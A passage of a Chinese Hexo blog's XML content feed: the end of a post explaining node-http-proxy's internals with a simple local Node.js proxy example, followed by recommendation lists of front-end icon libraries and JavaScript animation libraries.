&#123;</span><br><span class="line">      <span class="keyword">var</span> passes = (type === <span class="string">&#x27;ws&#x27;</span>) ? <span class="variable language_">this</span>.<span class="property">wsPasses</span> : <span class="variable language_">this</span>.<span class="property">webPasses</span>,</span><br><span class="line">          args = [].<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>),</span><br><span class="line">          cntr = args.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">          head, cbl;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* optional args parse begin */</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> args[cntr] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        cbl = args[cntr];</span><br><span class="line"></span><br><span class="line">        cntr--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> requestOptions = options;</span><br><span class="line">      <span class="keyword">if</span>(</span><br><span class="line">        !(args[cntr] <span class="keyword">instanceof</span> <span class="title class_">Buffer</span>) &amp;&amp;</span><br><span class="line">        args[cntr] !== res</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">//Copy global options</span></span><br><span class="line">        requestOptions = <span class="title function_">extend</span>(&#123;&#125;, options);</span><br><span class="line">        <span class="comment">//Overwrite with request options</span></span><br><span class="line">        <span class="title function_">extend</span>(requestOptions, args[cntr]);</span><br><span class="line"></span><br><span class="line">        cntr--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(args[cntr] <span class="keyword">instanceof</span> <span class="title class_">Buffer</span>) &#123;</span><br><span class="line">        head = args[cntr];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      [<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;forward&#x27;</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> requestOptions[e] === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">          requestOptions[e] = <span class="title function_">parse_url</span>(requestOptions[e]);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!requestOptions.<span class="property">target</span> &amp;&amp; !requestOptions.<span class="property">forward</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Must provide a proper URL as target&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; passes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(passes[i](req, res, requestOptions, head, <span class="variable language_">this</span>, cbl)) &#123; <span class="comment">// passes can return a truthy value to halt the loop</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">httpProxy.<span class="property">createRightProxy</span> = createRightProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ProxyServer</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="title class_">EE3</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">  options = options || &#123;&#125;;</span><br><span class="line">  options.<span class="property">prependPath</span> = options.<span class="property">prependPath</span> === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">web</span> = <span class="variable language_">this</span>.<span class="property">proxyRequest</span>           = <span class="title function_">createRightProxy</span>(<span class="string">&#x27;web&#x27;</span>)(options);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ws</span>  = <span class="variable language_">this</span>.<span class="property">proxyWebsocketRequest</span>  = <span class="title function_">createRightProxy</span>(<span class="string">&#x27;ws&#x27;</span>)(options);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">webPasses</span> = <span class="title class_">Object</span>.<span class="title function_">keys</span>(web).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> web[pass];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">wsPasses</span> = <span class="title class_">Object</span>.<span class="title function_">keys</span>(ws).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ws[pass];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="variable language_">this</span>.<span class="property">onError</span>, <span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>).<span class="title function_">inherits</span>(<span class="title class_">ProxyServer</span>, <span class="title class_">EE3</span>);</span><br></pre></td></tr></table></figure><p>结构</p><p><code>ProxyServer.createServer</code>  创建使用<br /><code>ProxyServer.createServer</code>  等价 <code>createProxyServer</code> <br /><code>createProxyServer</code>  返回一个 <code>ProxyServer</code>  实例</p><p>ProxyServer<br /><code>ProxyServer</code>  拥有 web 属性<br />web 属性 <code>createRightProxy</code>  支持 <code>http</code> ， <code>https</code> ， <code>webscoket</code> <br />轮询方法 <code>deleteLength</code> ， 设置 <code>content-length</code> <code>timeout</code> <code>XHeaders</code> <code>stream</code>   核心方法<br />处理 <code>http.request</code>   核心模块 <code>pipe</code>  <code>response</code></p><p>下面列出来他的核心方法。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555827-8d83ed48-4e64-4925-bbbe-fb9f9630a45e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555827-8d83ed48-4e64-4925-bbbe-fb9f9630a45e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="732dc02e"></a></p><h2 id="带你动手撸一个"><a href="#带你动手撸一个" class="headerlink" title="带你动手撸一个"></a>带你动手撸一个</h2><p>以下是我们代理的主要流程思路。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555669-7961c2a1-810e-44d6-a031-f517091f264e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589178555669-7961c2a1-810e-44d6-a031-f517091f264e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>api.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">huayifeng</span>: <span class="number">1</span>&#125;));</span><br><span class="line">    response.<span class="title function_">end</span>();</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="title function_">proxy</span>(req, res);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">proxy</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">hostname</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8081</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> proxyReq = http.<span class="title function_">request</span>(options);</span><br><span class="line"></span><br><span class="line">    proxyReq.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;problem with request: &#x27;</span> + e.<span class="property">message</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    proxyReq.<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="keyword">function</span>(<span class="params">proxyRes</span>) &#123;</span><br><span class="line">        proxyRes.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        proxyRes.<span class="title function_">pipe</span>(res);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    proxyReq.<span class="title function_">end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就简易实现了一个代理。当你访问 localhost:8080 请求已经被代理到 localhost:8081 了。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图标库</title>
      <link href="/2019/05/16/frontend/collection/wheel/tu-biao-ku/"/>
      <url>/2019/05/16/frontend/collection/wheel/tu-biao-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="uVpIM"></a></p><h2 id="1-IconPark"><a href="#1-IconPark" class="headerlink" title="1. IconPark"></a>1. IconPark</h2><p>IconPark 提供超过 2400 个高质量图标，还提供了每个图标的含义和来源的描述，便于开发者使用。除此之外，该网站还可以自定义图标，这是与其他图标网站与众不同的地方。该图标库是字节跳动旗下的技术驱动图标样式的开源图标库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654763709432-d1005f7c-1be9-468e-a1bd-7c889613ce25.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654763709432-d1005f7c-1be9-468e-a1bd-7c889613ce25.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/bytedance/iconpark">https://github.com/bytedance/iconpark</a><br><a name="utSN0"></a></p><h2 id="2-Font-Awesome"><a href="#2-Font-Awesome" class="headerlink" title="2. Font Awesome"></a>2. Font Awesome</h2><p>Font Awesome 提供了可缩放的矢量图标，可以使用 CSS 所提供的所有特性对它们进行更改，包括：大小、颜色、阴影或者其它任何支持的效果。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654763943916-4c569392-0c51-4dd5-a9cb-6900270b200d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654763943916-4c569392-0c51-4dd5-a9cb-6900270b200d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/FortAwesome/Font-Awesome">https://github.com/FortAwesome/Font-Awesome</a><br><a name="qcmQV"></a></p><h2 id="3-Ionicons"><a href="#3-Ionicons" class="headerlink" title="3. Ionicons"></a>3. Ionicons</h2><p>Ionicons 是一个完全开源的图标集，是知名混合开发框架 Ionic Framework 内置的图标库，包含 1300 个设计优雅、风格统一的高质量图标，能满足大多数的业务场景。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764121675-69522b19-59b6-4601-af04-26d20ea77eb9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764121675-69522b19-59b6-4601-af04-26d20ea77eb9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="F78kv"></a></p><h2 id="4-Bootstrap-Icons"><a href="#4-Bootstrap-Icons" class="headerlink" title="4. Bootstrap Icons"></a>4. Bootstrap Icons</h2><p>Bootstrap Icons 是 Bootstrap 开源的 SVG 图标库，此图标库起初专门针对其组件（从表单控件到导航）和文档进行定制设计和构建，现在可以免费用于任何项目。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764209164-bcbf319e-661e-4e3d-8099-760a316d24f6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764209164-bcbf319e-661e-4e3d-8099-760a316d24f6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="EN0eS"></a></p><h2 id="5-Unicons"><a href="#5-Unicons" class="headerlink" title="5. Unicons"></a>5. Unicons</h2><p>Unicons 是一套收录超过 4500 种图标的图标库，提供 SVG 矢量和图标字型（Iconfont）格式，使用者可以自订每个图标大小、颜色和颜色。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764499021-c3ec0e41-cb80-4383-bad2-7cc2198a1e54.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654764499021-c3ec0e41-cb80-4383-bad2-7cc2198a1e54.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="nXUx0"></a></p><h2 id="6-Tabler-Icons"><a href="#6-Tabler-Icons" class="headerlink" title="6. Tabler Icons"></a>6. Tabler Icons</h2><p>Tabler Icons 是一组超过 1950 个免费的高质量 SVG 图标，可以在 Web 项目中用。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654765090572-586b5285-63e4-4976-9b76-5ce960ac159d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1654765090572-586b5285-63e4-4976-9b76-5ce960ac159d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 图标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动画库</title>
      <link href="/2019/03/01/frontend/collection/wheel/dong-hua-ku/"/>
      <url>/2019/03/01/frontend/collection/wheel/dong-hua-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>很多时候我们在开发前端页面时都会做一些动画效果来提升用户体验度和页面美观度，所以今天就来给大家推荐几个好用的 JavaScript 动画库，希望对各位小伙伴有所帮助！</p><p><a name="Z7TS0"></a></p><h1 id="Animate-css"><a href="#Animate-css" class="headerlink" title="Animate.css"></a>Animate.css</h1><p>animate.css 是一个使用 CSS3 的 animation 制作的动画效果的 CSS 集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643079212742-891d0237-e517-421b-9a94-444861644415.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643079212742-891d0237-e517-421b-9a94-444861644415.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="aYbml"></a></p><h1 id="Hover-css"><a href="#Hover-css" class="headerlink" title="Hover.css"></a>Hover.css</h1><p>Hover.css 是一套基于 CSS3 的鼠标悬停效果和动画，这些可以非常轻松的被应用到按钮、LOGO 以及图片等元素。所有这些效果都是只需要单一的标签，必要的时候使用 before 和 after 伪元素。因为使用了 CSS3 过渡、转换和动画效果，因此只支持 Chrome、Firefox 和 Safari 等现代浏览器。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643885334717-b36150c7-6d61-4b57-b90f-38a7bce71cc7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643885334717-b36150c7-6d61-4b57-b90f-38a7bce71cc7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="bFOsx"></a></p><h1 id="Magic-css"><a href="#Magic-css" class="headerlink" title="Magic.css"></a>Magic.css</h1><p>Magic CSS3 Animations 动画是一款独特的 CSS3 动画特效包，可以自由地使用在网页中。只需简单的在页面上引入 CSS 文件: magic.css 或者压缩版本 magic.min.css 就可以使用了。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643885435396-2b5df028-041d-49b2-b136-de4214626b75.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643885435396-2b5df028-041d-49b2-b136-de4214626b75.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="wGOZ6"></a></p><h1 id="React-Spring"><a href="#React-Spring" class="headerlink" title="React Spring"></a>React Spring</h1><p>react-spring 是一个基于弹簧物理学的动画库，满足大多数与 UI 相关的动画需求，提供了足够灵活的工具，可以自信地将想法投射到不断变化的界面中。该库代表了一种现代动画方法。它继承了 animated 强大的插值和性能，以及 react-motion 的易用性。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878102964-52cd623b-075c-4c0a-8eea-08e53a5b6922.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878102964-52cd623b-075c-4c0a-8eea-08e53a5b6922.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="AxzNH"></a></p><h1 id="React-Reveal"><a href="#React-Reveal" class="headerlink" title="React Reveal"></a>React Reveal</h1><p>React Reveal 是一个用于 React 的高性能动画库。它占用空间小，专门为 ES6 中的 React 编写。可用于创建各种炫酷的滚动效果显示。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878159451-b74c722e-4448-4035-8248-b15890802718.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878159451-b74c722e-4448-4035-8248-b15890802718.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="UAcIs"></a></p><h1 id="Greensock"><a href="#Greensock" class="headerlink" title="Greensock"></a>Greensock</h1><p>GreenSock 是一个 JavaScript 动画库，可轻松对 HTML 元素进行动画处理。 用于创建高性能，零依赖性，跨浏览器动画，声称在超过 400 万个网站中使用。 其具有一下特点：<br />● 速度快，专门优化了动画性能，使之实现和 css 一样的高性能动画效果。<br />● 轻量与模块化。模块化与插件式的结构保持了核心引擎的轻量，TweenLite 包非常小(基本上低于 7kb)。提供了 TweenLite, TimelineLite, TimelineMax 和 TweenMax 不同功能的动画模块，你可以按需使用。<br />● 没有依赖。<br />● 灵活控制。不用受限于线性序列，可以重叠动画序列，可以通过精确时间控制，灵活地使用最少的代码实现动画。<br />● 任何对象都可以实现动画。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878632425-50cff842-d447-4a33-8aa8-123d55826940.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878632425-50cff842-d447-4a33-8aa8-123d55826940.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="EMS0s"></a></p><h1 id="Velocity-js"><a href="#Velocity-js" class="headerlink" title="Velocity.js"></a>Velocity.js</h1><p>Velocity.js 是 velocity 模板语法的 javascript 实现。Velocity 是基于 Java 的模板引擎，广泛应用在阿里集 体各个子公司。Velocity 模板适用于大量模板使用的场景，支持复杂的逻辑运算，包含 本数据类型、变量赋值和函数等功能。还拥有：<strong>颜色动画</strong>、<strong>转换动画(transforms)<strong>、</strong>循环</strong>、 <strong>缓动</strong>、<strong>SVG 动画</strong>、和 <strong>滚动动画</strong> 等特色功能。Velocity.js 支持 Node.js 和浏览器环境。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878973365-30359de7-cb34-46ca-a66d-ceb270bcadfc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643878973365-30359de7-cb34-46ca-a66d-ceb270bcadfc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>GitHub：<a href="http://github.com/julianshapiro/velocity">http://github.com/julianshapiro/velocity</a><br><a name="OkC3t"></a></p><h1 id="Lax-js"><a href="#Lax-js" class="headerlink" title="Lax.js"></a>Lax.js</h1><p>Lax.js 是一款原生零依赖的制作跟随页面滑动的 JavaScript 动画插件，这款插件非常的轻巧，压缩版大小只有 3kb。当滑动页面时，帮助创建酷炫的动画效果，比如滚动视差、变形移动等基本的动画效果，响应式兼容方面，比如手机端也有不错的支持。除了可以使用插件默认集成的动画属性，还可以自定义更加丰富的动画属性。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643884980168-b3a8b0a1-c68e-4baa-a312-a0b38980223e.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643884980168-b3a8b0a1-c68e-4baa-a312-a0b38980223e.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="E1iPL"></a></p><h1 id="Rellax-js"><a href="#Rellax-js" class="headerlink" title="Rellax.js"></a>Rellax.js</h1><p>rellax.js 是一款轻量级的纯 JavaScript 滚动视觉差特效插件。rellax.js 压缩后的版本仅 871 字节，在手机等小屏幕设备中，插件会自动限制视觉差特性。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643880381677-c0de007d-aa39-4a29-af21-bebebb8c939d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643880381677-c0de007d-aa39-4a29-af21-bebebb8c939d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="aRJcU"></a></p><h1 id="three-js"><a href="#three-js" class="headerlink" title="three.js"></a>three.js</h1><p>three.js 是一个易于使用、轻量级、跨浏览器的通用 JavaScript 3D 库，它是一套基于 WebGL 开发出的 Javascript 函式库，它提供了比 WebGL 更简单的 Javascript API，让开发者能够轻易在浏览器制作 3D 绘图。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643880619524-2e2a1392-ada9-442e-a8bd-ae70c922a005.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643880619524-2e2a1392-ada9-442e-a8bd-ae70c922a005.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="qdhLI"></a></p><h1 id="wow-js"><a href="#wow-js" class="headerlink" title="wow.js"></a>wow.js</h1><p>WOW.js 是一款帮助你实现滚动页面时触发 CSS 动画效果的插件。它依赖 